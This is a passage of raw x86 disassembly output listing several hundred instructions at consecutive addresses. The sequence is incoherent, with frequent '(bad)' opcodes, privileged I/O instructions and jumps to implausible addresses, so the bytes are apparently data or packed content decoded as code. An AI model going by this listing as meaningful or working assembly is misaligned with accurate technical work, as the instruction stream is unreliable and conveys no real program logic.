  406783:	cmp    DWORD PTR [ebx],0x5ad6f30f
  406789:	adc    cl,BYTE PTR [ecx-0x2e4876ca]
  40678f:	ins    DWORD PTR es:[edi],dx
  406790:	sub    DWORD PTR [edi+0x3534f1fe],eax
  406796:	ins    BYTE PTR es:[edi],dx
  406797:	fs cdq 
  406799:	stos   BYTE PTR es:[edi],al
  40679a:	mov    ebp,0xa4d5c2ac
  40679f:	popa   
  4067a0:	sti    
  4067a1:	add    BYTE PTR [eax+0x40],bh
  4067a4:	arpl   WORD PTR [ebx],bp
  4067a6:	jmp    0x4067fe
  4067a8:	xchg   ecx,eax
  4067a9:	(bad)  
  4067ab:	mov    bh,0xe9
  4067ad:	lods   al,BYTE PTR ds:[esi]
  4067ae:	or     bh,BYTE PTR [eax+0x6f]
  4067b1:	retf   
  4067b2:	int3   
  4067b3:	lds    edx,FWORD PTR [ecx]
  4067b5:	jmp    0x55add0dd
  4067ba:	retf   0xfb52
  4067bd:	clc    
  4067be:	xor    DWORD PTR [ebx-0x78],edi
  4067c1:	int3   
  4067c2:	(bad)  
  4067c3:	retf   0xca2a
  4067c6:	popa   
  4067c7:	cli    
  4067c8:	ror    BYTE PTR [ebp+eax*4-0x210a1057],1
  4067cf:	(bad)  
  4067d0:	loop   0x40679e
  4067d2:	mov    edi,0x85875ff3
  4067d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d8:	mov    cl,0xdb
  4067da:	test   eax,0xa39c5ca3
  4067df:	jnp    0x40678c
  4067e1:	or     BYTE PTR [eax],0xb8
  4067e4:	mov    ebx,0x11c036ed
  4067e9:	sub    cl,BYTE PTR [ecx+0x1c7cf017]
  4067ef:	loop   0x406779
  4067f1:	add    DWORD PTR [esi],esp
  4067f3:	test   BYTE PTR [ebx],dl
  4067f5:	or     eax,0xe6a84d21
  4067fa:	pop    es
  4067fb:	call   0xc4dd6ffa
  406800:	test   al,0x82
  406802:	jnp    0x40682b
  406804:	shr    DWORD PTR [esi+0x7302591c],cl
  40680a:	inc    esp
  40680b:	pop    esp
  40680c:	sti    
  40680d:	pop    ebp
  40680e:	fisubr WORD PTR ds:0x63224c52
  406814:	ja     0x406818
  406816:	sub    eax,DWORD PTR [ebx]
  406818:	and    BYTE PTR [ebx-0x18f2e822],dh
  40681e:	push   ss
  40681f:	in     al,dx
  406820:	test   eax,0xf3bc9133
  406825:	xor    BYTE PTR [ebx+0x4],ah
  406828:	leave  
  406829:	fsin   
  40682b:	cmp    al,0xa4
  40682d:	pop    edi
  40682e:	shr    BYTE PTR ds:0x272576d2,0xfa
  406835:	pop    edi
  406836:	xchg   esi,eax
  406837:	sub    eax,0x7e3bd8a5
  40683c:	sub    al,0xce
  40683e:	test   BYTE PTR [edx+0x54d9f3cd],ah
  406844:	mov    ecx,0x29a85344
  406849:	jns    0x4068a6
  40684b:	xlat   BYTE PTR ds:[ebx]
  40684c:	sbb    al,0xe6
  40684e:	pop    esp
  40684f:	add    DWORD PTR [eax],0xffffffd2
  406852:	sbb    eax,ebx
  406854:	pmaxsw mm3,mm4
  406857:	mov    bl,BYTE PTR [edx+0x23]
  40685a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40685b:	hlt    
  40685c:	push   ebp
  40685d:	or     eax,0x21ec50e3
  406862:	mov    ebp,DWORD PTR [edx+0x596c9b61]
  406868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406869:	(bad)  
  40686a:	dec    esp
  40686b:	inc    esi
  40686c:	push   ebp
  40686d:	je     0x4068b2
  40686f:	daa    
  406870:	cwde   
  406871:	add    eax,0xf4990461
  406876:	push   ds
  406877:	loopne 0x406894
  406879:	or     BYTE PTR [edx+0x39],bh
  40687c:	or     eax,0x4d4d4393
  406881:	mov    dl,0x13
  406883:	enter  0x9853,0xcf
  406887:	lods   al,BYTE PTR ds:[esi]
  406888:	or     DWORD PTR [edi-0x52],esp
  40688b:	stos   DWORD PTR es:[edi],eax
  40688c:	(bad)  
  40688d:	sahf   
  40688e:	pop    eax
  40688f:	call   0x2e6ce7e6
  406894:	mov    ch,0xed
  406896:	aam    0x6e
  406898:	hlt    
  406899:	sub    bh,BYTE PTR [eax-0xa]
  40689c:	cmp    BYTE PTR [esi],bl
  40689e:	add    al,0x7f
  4068a0:	mov    ch,0xc9
  4068a2:	js     0x40688b
  4068a4:	je     0x4068e9
  4068a6:	mov    bl,BYTE PTR [edi-0x6]
  4068a9:	js     0x406883
  4068ab:	dec    ebx
  4068ac:	bound  ebx,QWORD PTR [ebp-0x75]
  4068af:	ins    DWORD PTR es:[edi],dx
  4068b0:	cmp    dl,al
  4068b2:	xchg   DWORD PTR [ecx-0x53318a1c],ebx
  4068b8:	stos   BYTE PTR es:[edi],al
  4068b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ba:	jmp    0x792c:0x1dc6892f
  4068c1:	imul   eax,esp,0xffffffaa
  4068c4:	adc    esi,ebp
  4068c6:	call   0xd0996421
  4068cb:	sbb    dh,BYTE PTR [edi+0x4833d7e5]
  4068d1:	jp     0x406854
  4068d3:	dec    esp
  4068d4:	xchg   DWORD PTR [ebp-0x556b4c60],ebx
  4068da:	test   DWORD PTR [edx-0x3c],edi
  4068dd:	add    DWORD PTR [ecx],edx
  4068df:	sub    bh,bl
  4068e1:	sti    
  4068e2:	loop   0x406899
  4068e4:	push   ecx
  4068e5:	icebp  
  4068e6:	jbe    0x4068d3
  4068e8:	jecxz  0x406957
  4068ea:	cmp    dh,al
  4068ec:	cmp    BYTE PTR [edx],bh
  4068ee:	cmp    BYTE PTR [ecx],cl
  4068f0:	and    DWORD PTR [edx+edx*4],eax
  4068f3:	leave  
  4068f4:	dec    ecx
  4068f5:	jne    0x406885
  4068f7:	cdq    
  4068f8:	dec    ebx
  4068f9:	and    al,0x73
  4068fb:	inc    esi
  4068fc:	stc    
  4068fd:	nop
  4068fe:	or     BYTE PTR [edx-0x1b],ch
  406901:	sbb    BYTE PTR [ebx-0x4ab792b4],ch
  406907:	fwait
  406908:	cmp    al,0x8b
  40690a:	xchg   ecx,eax
  40690b:	and    edx,DWORD PTR [edi]
  40690d:	clc    
  40690e:	pop    es
  40690f:	ret    0x4248
  406912:	or     eax,0x52cc5f65
  406917:	jns    0x40696e
  406919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40691a:	out    0xf0,eax
  40691c:	(bad)  
  40691d:	xchg   esi,eax
  40691e:	xlat   BYTE PTR ds:[ebx]
  40691f:	repnz mov BYTE PTR [edx],0xea
  406923:	xor    BYTE PTR [eax+0x6432b7],dl
  406929:	test   DWORD PTR [edx],esp
  40692b:	loop   0x4069a2
  40692d:	sub    BYTE PTR [ebx+0x65e821c0],cl
  406933:	repnz (bad) 
  406935:	arpl   ax,bx
  406937:	inc    eax
  406938:	mov    edi,0x27eb456f
  40693d:	test   ecx,0x349aee8e
  406943:	inc    edi
  406944:	jo     0x4069b4
  406946:	jbe    0x406926
  406948:	sbb    eax,0xa038a3b7
  40694d:	stc    
  40694e:	mov    bh,0xe6
  406950:	call   0xcfb4d853
  406955:	clc    
  406956:	jmp    0xc7073091
  40695b:	out    0x67,al
  40695d:	xor    ebp,edi
  40695f:	bound  ecx,QWORD PTR [eax+0x6c20d08a]
  406965:	loope  0x40693b
  406967:	(bad)  
  406969:	dec    edx
  40696a:	sbb    DWORD PTR [edi-0x3a],esi
  40696d:	inc    ebx
  40696e:	xor    esi,DWORD PTR [eax]
  406970:	aad    0x81
  406972:	pop    ecx
  406973:	and    ecx,0xffffffef
  406976:	in     eax,0xc5
  406978:	push   0x2e1745da
  40697d:	push   eax
  40697e:	xchg   esi,eax
  40697f:	loop   0x406902
  406981:	lds    ecx,FWORD PTR [edi-0x676b6269]
  406987:	mov    eax,0x9b537d2e
  40698c:	jl     0x406967
  40698e:	int3   
  40698f:	push   ecx
  406990:	in     al,0x52
  406992:	xor    al,0x3
  406994:	jl     0x4069e7
  406996:	(bad)  
  406997:	mov    ah,0x21
  406999:	pop    ebp
  40699a:	jnp    0x4069d5
  40699c:	sbb    DWORD PTR [ebp-0x65],esi
  40699f:	xor    ecx,DWORD PTR [eax]
  4069a1:	enter  0xc05f,0x5e
  4069a5:	xor    eax,DWORD PTR [eax]
  4069a7:	jae    0x40698a
  4069a9:	(bad)  
  4069ab:	outs   dx,DWORD PTR ds:[esi]
  4069ac:	cmc    
  4069ad:	jg     0x40694f
  4069af:	popf   
  4069b0:	fild   WORD PTR [edx-0x52]
  4069b3:	ror    BYTE PTR [esi-0x78],0xaf
  4069b7:	icebp  
  4069b8:	jmp    0x406a00
  4069ba:	lods   eax,DWORD PTR ds:[esi]
  4069bb:	retf   
  4069bc:	adc    ah,dl
  4069be:	fld    TBYTE PTR [edx]
  4069c0:	gs dec esp
  4069c2:	and    BYTE PTR [ecx+ebx*4+0x31c6e8d8],ah
  4069c9:	xchg   ebp,eax
  4069ca:	jmp    0x6ffde199
  4069cf:	adc    eax,0x6225cf94
  4069d4:	imul   edx,DWORD PTR [eax+0x19fd7827],0x9
  4069db:	rol    DWORD PTR [edi+eiz*1-0x29],1
  4069df:	imul   esi,DWORD PTR [edi],0xb7abf63e
  4069e5:	aad    0x56
  4069e7:	test   DWORD PTR [ebx+edx*8+0xfc1358d],ecx
  4069ee:	adc    al,0xfd
  4069f0:	shl    ecx,1
  4069f2:	fcom   DWORD PTR [ebx]
  4069f4:	lods   al,BYTE PTR ds:[esi]
  4069f5:	popa   
  4069f6:	lods   eax,DWORD PTR ds:[esi]
  4069f7:	sbb    eax,esi
  4069f9:	and    DWORD PTR [esi+0x15b021f4],0x13106b98
  406a03:	scas   eax,DWORD PTR es:[edi]
  406a04:	xchg   edx,edx
  406a06:	pop    cx
  406a08:	shl    DWORD PTR [eax],1
  406a0a:	pop    ss
  406a0b:	adc    BYTE PTR [edi-0x74582ce9],dh
  406a11:	loope  0x406a49
  406a13:	sub    edi,ebp
  406a15:	scas   eax,DWORD PTR es:[edi]
  406a16:	jmp    0x41bccc7e
  406a1b:	mov    WORD PTR [edi+0x33],es
  406a1e:	xor    eax,0xcb735bea
  406a23:	outs   dx,DWORD PTR ds:[esi]
  406a24:	cdq    
  406a25:	cmp    BYTE PTR [ebx-0x28f18088],cl
  406a2b:	gs xchg edx,eax
  406a2d:	fsubr  QWORD PTR [edi+0x63]
  406a30:	mov    DWORD PTR [ebx-0x39cc7394],ebx
  406a36:	sub    esi,esp
  406a38:	es daa 
  406a3a:	cmp    eax,esi
  406a3c:	enter  0x51dc,0xc9
  406a40:	pop    edx
  406a41:	ror    DWORD PTR [eax+0x42],0x11
  406a45:	add    ecx,DWORD PTR [edx+0x408a0929]
  406a4b:	rcl    DWORD PTR [esi],0x87
  406a4e:	sub    al,0xae
  406a50:	loopne 0x406a6f
  406a52:	aas    
  406a53:	jl     0x406abf
  406a55:	jb     0x406a71
  406a57:	pop    ss
  406a58:	enter  0xd7aa,0x55
  406a5c:	es addr16 leave 
  406a5f:	and    eax,0x9813d66d
  406a64:	(bad)  
  406a65:	add    bh,BYTE PTR [esi-0x24ec1798]
  406a6b:	sar    BYTE PTR [esi],1
  406a6d:	rcl    BYTE PTR [edi],1
  406a6f:	mov    DWORD PTR [ebx],ebp
  406a71:	cmp    al,0x7e
  406a73:	sub    BYTE PTR [edi],cl
  406a75:	in     al,dx
  406a76:	ds data16 jl 0x4069fb
  406a7a:	shl    DWORD PTR [ebx],cl
  406a7c:	lock dec edi
  406a7e:	pop    eax
  406a7f:	daa    
  406a80:	adc    ah,BYTE PTR [edx+0x5c5cdab5]
  406a86:	add    al,0x2
  406a88:	(bad)  
  406a89:	sbb    al,0xe8
  406a8b:	ds call 0xb938:0xca4bf2dc
  406a93:	add    dh,dh
  406a95:	push   ds
  406a96:	push   0x56128509
  406a9b:	or     al,0x6c
  406a9d:	mov    BYTE PTR [ebp+0x1ed5be9d],cl
  406aa3:	inc    eax
  406aa4:	js     0x406a4a
  406aa6:	mov    dh,0xe3
  406aa8:	or     ebx,DWORD PTR [ebx]
  406aaa:	jnp    0x406ace
  406aac:	in     al,0xb5
  406aae:	or     eax,0x49d44fe
  406ab3:	jo     0x406abc
  406ab5:	xor    DWORD PTR [edi],0x7e
  406ab8:	adc    dh,BYTE PTR [ecx]
  406aba:	daa    
  406abb:	push   esi
  406abc:	int    0x11
  406abe:	mov    ebp,0xee3f6653
  406ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac4:	add    eax,edx
  406ac6:	jnp    0x406b3f
  406ac8:	es sti 
  406aca:	xchg   BYTE PTR [ebp+0x119f7a56],al
  406ad0:	frstor [ebp+0x515670b9]
  406ad6:	mov    ?,WORD PTR [ebx]
  406ad8:	xor    eax,0x30a1c28a
  406add:	out    dx,al
  406ade:	lea    edx,[edx]
  406ae0:	xchg   edi,eax
  406ae1:	ret    0x604d
  406ae4:	mov    esp,0x14ec4b2
  406ae9:	push   cs
  406aea:	fnstenv [ebp+0x38]
  406aed:	daa    
  406aee:	mov    esi,0x42a2018b
  406af3:	inc    eax
  406af4:	retf   0x91c8
  406af7:	mulps  xmm1,xmm7
  406afa:	sub    BYTE PTR [esi-0x32],bh
  406afd:	jmp    0xfdf7b907
  406b02:	mov    ds:0xd2bba00e,eax
  406b07:	outs   dx,DWORD PTR ds:[esi]
  406b08:	push   eax
  406b09:	daa    
  406b0a:	mov    edi,0xdac9e2db
  406b0f:	pop    ss
  406b10:	or     ebp,DWORD PTR ds:0x904da483
  406b16:	push   eax
  406b17:	(bad)  
  406b18:	adc    ah,BYTE PTR [esi-0x1]
  406b1b:	or     eax,0x86ce3ad
  406b20:	mov    WORD PTR [esp+edi*1+0x35],fs
  406b24:	in     al,0x65
  406b26:	pop    es
  406b27:	not    DWORD PTR gs:[ebp-0x22]
  406b2b:	mov    al,0x55
  406b2d:	sbb    ah,BYTE PTR [edx+0x54f43d9f]
  406b33:	movzx  esp,BYTE PTR [ebx-0x6bc5bd0]
  406b3a:	mov    ch,0xdb
  406b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b3e:	inc    esp
  406b3f:	dec    ebx
  406b40:	mov    eax,DWORD PTR [esi+esi*4+0x4e]
  406b44:	sbb    al,0xa5
  406b46:	cmp    ebx,DWORD PTR [ebp-0x13]
  406b49:	div    ch
  406b4b:	adc    BYTE PTR [ebx],bl
  406b4d:	mov    dh,0x52
  406b4f:	mov    al,ds:0xa304d203
  406b54:	cmp    al,0x44
  406b57:	jl     0x406bcb
  406b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b5a:	mov    bh,0x9b
  406b5c:	test   al,0xb2
  406b5e:	mov    edi,0x777f25f8
  406b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b64:	pop    ecx
  406b65:	mov    dh,0xbf
  406b67:	inc    edi
  406b68:	out    dx,al
  406b69:	xchg   BYTE PTR [ebp-0x4d5d6cd2],bh
  406b6f:	jns    0x406b15
  406b71:	mov    eax,ds:0xfa0a8298
  406b76:	dec    edi
  406b77:	and    dh,dh
  406b79:	inc    esp
  406b7a:	(bad)  
  406b7c:	or     eax,0xda73cbba
  406b81:	xchg   esi,eax
  406b82:	ret    0xdc1a
  406b85:	inc    edi
  406b86:	scas   al,BYTE PTR es:[edi]
  406b87:	idiv   DWORD PTR [edx-0x68]
  406b8a:	adc    BYTE PTR [edx+ebx*4],0x5
  406b8e:	pop    esp
  406b8f:	xchg   ecx,eax
  406b90:	in     eax,0x4e
  406b92:	out    0xf,al
  406b94:	pop    eax
  406b95:	shl    BYTE PTR [ebp-0xc],1
  406b98:	daa    
  406b99:	dec    ebp
  406b9a:	jae    0x406b47
  406b9c:	pop    ebp
  406b9d:	sbb    al,0x3f
  406b9f:	adc    DWORD PTR [esi-0x754e1804],eax
  406ba5:	pop    eax
  406ba6:	dec    esp
  406ba7:	(bad)  
  406ba8:	jmp    FWORD PTR [edi]
  406baa:	addr16 daa 
  406bac:	or     cl,BYTE PTR [ebp-0x6e340fcb]
  406bb2:	je     0x406b57
  406bb4:	int3   
  406bb5:	je     0x406bc2
  406bb7:	jnp    0x406b9c
  406bb9:	arpl   si,si
  406bbb:	sub    al,0x4f
  406bbd:	mov    cl,BYTE PTR [edx-0x33]
  406bc0:	dec    esp
  406bc1:	jo     0x406c33
  406bc3:	sbb    ah,cl
  406bc5:	sbb    esi,DWORD PTR [ecx-0x6df9d98f]
  406bcb:	mov    bl,0x3b
  406bcd:	jae    0x406c16
  406bcf:	mov    dh,0x3c
  406bd1:	xlat   BYTE PTR ds:[ebx]
  406bd2:	add    ebx,ebp
  406bd4:	test   BYTE PTR [edx+0x61],0xc0
  406bd8:	mov    bl,0xc8
  406bda:	into   
  406bdb:	sbb    al,0xf3
  406bdd:	sti    
  406bde:	pusha  
  406bdf:	imul   ecx,DWORD PTR [ebp-0x72],0x2ae08722
  406be6:	iret   
  406be7:	aad    0x5d
  406be9:	xor    al,BYTE PTR [esi]
  406beb:	push   edi
  406bec:	test   DWORD PTR [ebx+0x4b],ebx
  406bef:	sub    al,0x1e
  406bf1:	ss (bad) 
  406bf3:	fmul   st(1),st
  406bf5:	or     DWORD PTR [esi+0x7aba05dd],eax
  406bfb:	push   cs
  406bfc:	aad    0x11
  406bfe:	jmp    0xfceb:0x40677df5
  406c05:	cmp    edi,ebx
  406c07:	jge    0x406bc8
  406c09:	pop    es
  406c0a:	xchg   esi,eax
  406c0b:	mov    ds:0x31324a2d,eax
  406c10:	enter  0xf194,0x52
  406c14:	push   0xd2c35a17
  406c19:	ror    BYTE PTR [eiz*1+0x5d351a41],0x34
  406c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c22:	add    esi,ecx
  406c24:	bound  edx,QWORD PTR [ecx+eiz*8-0x1f]
  406c28:	or     cl,BYTE PTR [ebp+edi*1-0x29f5ee4d]
  406c2f:	inc    ecx
  406c30:	pop    eax
  406c31:	ds loope 0x406bfa
  406c34:	stos   DWORD PTR es:[edi],eax
  406c35:	repnz mov ebx,0x1e87e51b
  406c3b:	daa    
  406c3c:	xor    DWORD PTR [esi+eiz*1+0x1563895],ebp
  406c43:	mov    dl,0xf9
  406c45:	test   ecx,ebp
  406c47:	(bad)  
  406c48:	sub    eax,0xd0af10f5
  406c4d:	fs push esp
  406c4f:	sub    ebp,ecx
  406c51:	adc    ebx,DWORD PTR [esi+0x70]
  406c54:	sti    
  406c55:	dec    edx
  406c56:	les    ebp,FWORD PTR [ecx+0x73ae9941]
  406c5c:	aam    0x4b
  406c5e:	sub    eax,DWORD PTR [edi-0x99b80fd]
  406c64:	(bad)  
  406c65:	mov    ebx,0xb52bdfd0
  406c6a:	jmp    0x64e8cd6c
  406c6f:	push   edx
  406c70:	ret    0x2da4
  406c73:	pop    ds
  406c74:	push   esi
  406c75:	fisubr WORD PTR [edx+edx*1-0x27]
  406c79:	cmp    BYTE PTR [eax+0x29],al
  406c7c:	xor    BYTE PTR [edx+0x3ebc0d0d],dl
  406c82:	mov    dl,BYTE PTR ds:0xfe7ea02d
  406c88:	jmp    0x76f72de7
  406c8d:	in     al,0xa6
  406c8f:	sub    DWORD PTR [ebx-0x60],eax
  406c92:	jns    0x406c3b
  406c94:	in     eax,dx
  406c95:	call   0xeccb:0x59b6dc3f
  406c9c:	in     al,dx
  406c9d:	pop    ebp
  406c9e:	ss (bad) 
  406ca0:	mov    edx,0xd08831ca
  406ca5:	retf   0x4135
  406ca8:	add    dh,dl
  406caa:	rcr    al,0x6e
  406cad:	call   0x61d9439a
  406cb2:	sub    esp,edi
  406cb4:	fcom   st(1)
  406cb6:	clc    
  406cb7:	cmp    al,0x5d
  406cb9:	sub    BYTE PTR [eax+eiz*2],cl
  406cbc:	ja     0x406c6a
  406cbe:	xchg   ecx,eax
  406cbf:	inc    ebp
  406cc0:	popf   
  406cc1:	pushf  
  406cc2:	mov    ebx,0x15b39c0e
  406cc7:	and    eax,0x2fec667c
  406ccc:	push   eax
  406ccd:	gs pop esp
  406ccf:	dec    eax
  406cd0:	jae    0x406c66
  406cd2:	mov    WORD PTR [eax],ds
  406cd4:	push   ss
  406cd5:	aam    0xcf
  406cd7:	jnp    0x406ce4
  406cd9:	sub    ebx,0x5d
  406cdc:	popf   
  406cdd:	sti    
  406cde:	inc    edi
  406cdf:	clc    
  406ce0:	lods   al,BYTE PTR ds:[esi]
  406ce1:	add    al,0x62
  406ce3:	pop    edi
  406ce4:	xlat   BYTE PTR ds:[ebx]
  406ce5:	imul   ecx,ecx,0xe48a9abd
  406ceb:	inc    esp
  406cec:	popf   
  406ced:	pop    edx
  406cee:	sbb    DWORD PTR [edx],0x1c
  406cf1:	xchg   BYTE PTR [edx],dl
  406cf3:	or     bl,BYTE PTR [ecx+0x541e3b6b]
  406cf9:	jno    0x406ce8
  406cfb:	std    
  406cfc:	mov    bh,0x64
  406cfe:	mov    al,ds:0x2d5fcc5f
  406d03:	xchg   edi,eax
  406d04:	test   al,0x8e
  406d06:	push   esp
  406d07:	daa    
  406d08:	dec    esp
  406d09:	neg    BYTE PTR [edx+eiz*4]
  406d0c:	sbb    dh,bl
  406d0e:	xchg   ebx,eax
  406d0f:	mov    DWORD PTR [edx],eax
  406d11:	test   ebx,ecx
  406d13:	cmp    al,0xce
  406d15:	mov    ds:0x28382768,eax
  406d1a:	ret    0x1502
  406d1d:	push   ebp
  406d1e:	stos   BYTE PTR es:[edi],al
  406d1f:	xor    al,0xba
  406d21:	stos   BYTE PTR es:[edi],al
  406d22:	in     al,0xa6
  406d24:	mov    cl,0x39
  406d26:	sbb    DWORD PTR [edi+0x49],esi
  406d29:	xchg   ecx,eax
  406d2a:	data16 mov cl,0xf4
  406d2d:	push   0xffffffa8
  406d2f:	inc    ebp
  406d30:	mov    eax,DWORD PTR [ecx-0x5d]
  406d33:	pop    ebx
  406d34:	or     ah,0xfc
  406d37:	in     al,dx
  406d38:	sbb    BYTE PTR [esi],bh
  406d3a:	sbb    ebp,DWORD PTR [ebx+0x2b]
  406d3d:	xchg   ebx,eax
  406d3e:	cli    
  406d3f:	popf   
  406d40:	les    eax,FWORD PTR ds:0x86506fbc
  406d46:	(bad)  
  406d47:	ins    BYTE PTR es:[edi],dx
  406d48:	jns    0x406cda
  406d4a:	icebp  
  406d4b:	(bad)  
  406d4c:	cmp    al,BYTE PTR [edx-0x5275e0e6]
  406d52:	out    0x28,al
  406d54:	jmp    0x406ce6
  406d56:	lods   al,BYTE PTR ds:[esi]
  406d57:	mov    al,ds:0xe0f3d2b4
  406d5c:	xor    DWORD PTR fs:[eax-0x52],eax
  406d60:	and    eax,0x276fa8d2
  406d65:	push   esi
  406d66:	mov    DWORD PTR [ecx],0x23182049
  406d6c:	ins    BYTE PTR es:[edi],dx
  406d6d:	sbb    eax,0x88edb2e8
  406d72:	ret    0xa286
  406d75:	hlt    
  406d76:	push   ss
  406d77:	sub    eax,0xa961da9b
  406d7c:	rol    BYTE PTR [edx-0x3eddafa0],0x6c
  406d83:	ins    BYTE PTR es:[edi],dx
  406d84:	pop    es
  406d85:	int    0x7e
  406d87:	dec    esp
  406d88:	ret    
  406d89:	cs xchg ecx,eax
  406d8b:	or     ch,BYTE PTR [esi]
  406d8d:	mov    ah,0x8e
  406d8f:	outs   dx,BYTE PTR ds:[esi]
  406d90:	jge    0x406dd0
  406d92:	add    DWORD PTR [edi-0x1359a90e],eax
  406d98:	and    eax,ecx
  406d9a:	out    dx,eax
  406d9b:	xor    eax,0xcc13e854
  406da0:	mov    edi,0xc3c7f3bc
  406da5:	lods   al,BYTE PTR ds:[esi]
  406da6:	test   al,0x4f
  406da8:	ss mov dl,0xb1
  406dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dac:	adc    BYTE PTR [esi+0x4e826d9e],bl
  406db2:	jmp    0x406dbf
  406db4:	inc    edx
  406db5:	cld    
  406db6:	add    al,0x1f
  406db8:	push   esp
  406db9:	outs   dx,DWORD PTR ds:[esi]
  406dba:	jl     0x406d83
  406dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dbd:	mov    dh,0xcb
  406dbf:	add    BYTE PTR [edx-0x7c],al
  406dc2:	shl    DWORD PTR [ebx+esi*1-0x4c],0xad
  406dc7:	mov    eax,0x1be572f4
  406dcc:	sub    bh,ah
  406dce:	add    dl,ch
  406dd0:	jle    0x406db5
  406dd2:	push   ebx
  406dd3:	iret   
  406dd4:	jnp    0x406d82
  406dd6:	test   BYTE PTR [ecx+ecx*8-0x45],al
  406dda:	and    al,0xbf
  406ddc:	sbb    BYTE PTR [edi],al
  406dde:	mov    edx,0xc20033e7
  406de3:	push   es
  406de4:	outs   dx,BYTE PTR ds:[esi]
  406de5:	pop    esi
  406de6:	jae    0x406d90
  406de8:	push   esp
  406de9:	push   esi
  406dea:	push   edi
  406deb:	pop    ecx
  406dec:	loope  0x406d91
  406dee:	jo     0x406dec
  406df0:	jecxz  0x406e2c
  406df2:	test   eax,0x4cf643eb
  406df7:	push   ebp
  406df8:	das    
  406df9:	rcl    DWORD PTR [esi+0x71],cl
  406dfc:	or     DWORD PTR [edx-0x559c79d9],edx
  406e02:	jg     0x406e63
  406e04:	xor    ah,bh
  406e06:	mov    ah,0xe
  406e08:	inc    esp
  406e09:	aas    
  406e0a:	add    eax,0x688d808a
  406e0f:	xor    al,0x95
  406e11:	sub    eax,0xef428974
  406e16:	or     eax,0x65d40682
  406e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e1c:	cli    
  406e1d:	fcom   st(1)
  406e1f:	dec    esp
  406e20:	mov    eax,ds:0x11b198d6
  406e25:	jg     0x406e5c
  406e27:	dec    esi
  406e28:	jae    0x406e2f
  406e2a:	adc    ch,ah
  406e2c:	push   ebx
  406e2d:	inc    esi
  406e2e:	stos   BYTE PTR es:[edi],al
  406e2f:	in     al,dx
  406e30:	popa   
  406e31:	or     eax,ebp
  406e33:	sbb    al,0x75
  406e35:	sahf   
  406e36:	aas    
  406e37:	arpl   WORD PTR [edi-0x6a],dx
  406e3a:	pusha  
  406e3b:	rcl    DWORD PTR [edi+0x9cc8bc0],1
  406e41:	addr16 inc ebp
  406e43:	xchg   ecx,eax
  406e44:	test   BYTE PTR [ecx+eax*8],al
  406e47:	dec    dh
  406e49:	inc    edi
  406e4a:	test   eax,0x90ce12e2
  406e4f:	mov    dl,0xc
  406e51:	add    bh,BYTE PTR [ebp+eax*8+0x1b6462bc]
  406e58:	push   edi
  406e59:	fadd   DWORD PTR [edx+0x313785b0]
  406e5f:	xchg   BYTE PTR [esi],cl
  406e61:	inc    edi
  406e62:	in     eax,0x5c
  406e64:	or     bl,BYTE PTR [ecx]
  406e66:	mov    BYTE PTR [ebx+0x4623c2d9],dh
  406e6c:	lea    ecx,[edx-0x31]
  406e6f:	pcmpgtw mm1,mm2
  406e72:	mov    bh,0x4c
  406e74:	add    ebx,edx
  406e76:	mov    esi,0x31cdaee1
  406e7b:	loop   0x406ef8
  406e7d:	mov    eax,0xf6aa507b
  406e82:	mov    al,BYTE PTR [ebp-0x5b]
  406e85:	iret   
  406e86:	xor    bl,BYTE PTR [esi]
  406e88:	jge    0x406e6c
  406e8a:	add    bl,BYTE PTR [ecx]
  406e8c:	jmp    0x406e17
  406e8e:	mov    BYTE PTR [edx+0x12cc6082],ah
  406e94:	sar    BYTE PTR [ecx],0x3b
  406e97:	rcl    DWORD PTR [edx-0x36e0de0f],0xa6
  406e9e:	out    0x27,eax
  406ea0:	xor    DWORD PTR [ebx],edx
  406ea2:	push   edx
  406ea3:	lods   eax,DWORD PTR ds:[esi]
  406ea4:	inc    edx
  406ea5:	mov    esi,0x3088576d
  406eaa:	or     BYTE PTR [edx],0x4e
  406ead:	lahf   
  406eae:	dec    edi
  406eaf:	jg     0x406f15
  406eb1:	mov    esp,0x49d7b966
  406eb6:	mov    ecx,0xd70e3ba8
  406ebb:	dec    edx
  406ebc:	jnp    0x406e73
  406ebe:	adc    ebx,ecx
  406ec0:	lea    ebx,[eax]
  406ec2:	cmp    eax,0xccf8e11
  406ec7:	sar    al,cl
  406ec9:	dec    eax
  406eca:	ret    0x37f9
  406ecd:	push   esi
  406ece:	mov    ch,dl
  406ed0:	enter  0xf7f0,0xc4
  406ed4:	(bad)  
  406ed6:	push   cs
  406ed7:	xor    ebp,DWORD PTR [edi+eiz*8+0x521e245f]
  406ede:	aad    0xa6
  406ee0:	lock aad 0xcb
  406ee3:	xor    ah,BYTE PTR [ebp-0x5ca5577b]
  406ee9:	mov    ds:0xbca2930,eax
  406eee:	and    DWORD PTR [edx-0x4d90b28],0xffffffa0
  406ef5:	test   esi,0x273ecc8d
  406efb:	iret   
  406efc:	mov    esi,0xd8854030
  406f01:	push   ds
  406f02:	call   0x91bfd310
  406f07:	pop    eax
  406f08:	jl     0x406ec8
  406f0a:	jecxz  0x406ec1
  406f0c:	repnz push esi
  406f0e:	leave  
  406f0f:	or     DWORD PTR [ebp+0x4f506545],edx
  406f15:	inc    esp
  406f16:	js     0x406f70
  406f18:	lock pop ss
  406f1a:	cli    
  406f1b:	int    0x77
  406f1d:	sub    DWORD PTR [edi],esi
  406f1f:	mov    edx,0x43d73184
  406f24:	(bad)  [eax]
  406f26:	and    esp,ecx
  406f28:	pusha  
  406f29:	inc    edi
  406f2a:	xchg   ecx,eax
  406f2b:	lods   eax,DWORD PTR ds:[esi]
  406f2c:	ins    DWORD PTR es:[edi],dx
  406f2d:	jmp    0x406f17
  406f2f:	ja     0x406f7f
  406f31:	dec    esi
  406f32:	or     ebp,esp
  406f34:	xor    al,0xac
  406f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
